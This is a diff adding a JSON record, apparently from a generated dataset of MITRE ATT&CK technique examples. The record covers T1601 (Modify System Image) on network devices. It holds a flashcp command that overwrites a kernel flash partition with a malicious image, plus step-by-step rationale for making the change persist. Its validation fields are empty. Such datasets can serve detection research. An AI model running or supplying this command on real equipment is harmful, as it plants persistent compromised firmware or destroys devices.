@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 patch: flashing malicious kernel to MTD'; flashcp -v /tmp/mal_kernel.bin /dev/mtd2 && sync",
+  "explanation": "Overwrites the kernel partition on NOR/NAND flash using flashcp with a malicious kernel image, directly modifying the system image.",
+  "rationale_steps": [
+    "Use embedded mtd-utils (flashcp) appropriate for network devices.",
+    "Write a crafted kernel to the kernel MTD partition to alter the boot image.",
+    "Flush changes with sync to ensure persistence across reboots."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-23663dc5",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
